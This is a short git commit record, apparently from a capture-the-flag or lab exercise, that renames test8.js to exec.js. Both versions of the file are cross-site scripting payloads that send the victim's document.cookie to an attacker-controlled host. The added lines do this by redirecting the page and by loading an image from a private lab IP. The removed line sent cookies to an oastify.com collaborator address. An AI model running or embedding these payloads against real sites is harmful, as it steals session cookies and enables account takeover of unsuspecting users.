09091c9c3ea00af09e00e21f47b6c9ffcf40f4e9
VidSovic <61434487+VidSovic@users.noreply.github.com>
2024-04-28 20:42:22 +0200

    Update and rename test8.js to exec.js

---
+++ exec.js
@@ -0,0 +1,2 @@
+document.location=("http://10.10.14.27?c="+document.cookie);
+new Image().src="http://10.10.14.27?c="+document.cookie;
--- test8.js
+++
@@ -1,1 +0,0 @@
-document.location=("http://bo3k7i5yzm0g2lamnxqhajpdz45vtlha.oastify.com/test?c="+document.cookie);
